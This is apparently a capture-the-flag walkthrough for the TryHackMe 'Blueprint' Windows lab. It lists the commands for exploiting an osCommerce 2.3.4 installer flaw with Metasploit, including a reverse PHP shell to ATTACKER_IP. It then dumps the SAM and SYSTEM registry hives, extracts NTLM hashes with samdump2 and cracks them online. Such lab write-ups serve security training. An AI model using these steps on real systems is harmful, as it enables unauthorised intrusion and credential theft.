# [Blueprint](https://tryhackme.com/room/blueprint)

## Hack into this Windows machine and escalate your privileges to Administrator

### "Lab" user NTLM hash decrypted

1. First scan ports with nmap to identify available services

```bash
nmap IP
```

[SCREEN01]

2. After exploring the services, navigate to `https://<TARGET_IP>:443`. Here we discover an `oscommerce-2.3.4` directory. Online research indicated that this version has a remote code execution vulnerability that can be exploited using Metasploit

```bash
msfconsole
use exploit/multi/http/oscommerce_installer_unauth_code_exec
show options
set URI /oscommerce-2.3.4/catalog/install
set PAYLOAD php/reverse_php
set SSL true
set RHOSTS TARGET_IP
set RPORT 443
set LHOST ATTACKER_IP
set LPORT 4444
run

whoami
```

[SCREEN02]

3. Navigate to the web application directory and extract the Windows registry hives containing password data

```bash
cd C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
reg.exe save hklm\sam SAM
reg.exe save hklm\security SECURITY
reg.exe save hklm\system SYSTEM
```

[SCREEN03]

```bash
samdump2 SYSTEM SAM
```

4. Download the registry hive files from the web server by accessing `https://IP/oscommerce-2.3.4/catalog/install/includes/`

5. Once downloaded to your attack machine, use `samdump2` to extract the password hashes

```bash
samdump2 SYSTEM SAM
```

[SCREEN04]

6. Copy the NTLM hash for the "Lab" user and paste it into [CrackStation](https://crackstation.net/) to decode it

[SCREEN05]

---

### root.txt

1. We can directly access the Administrator directory

```bash
cd C:\Users\Administrator\Desktop
dir
type root.txt.txt
```

[SCREEN06]
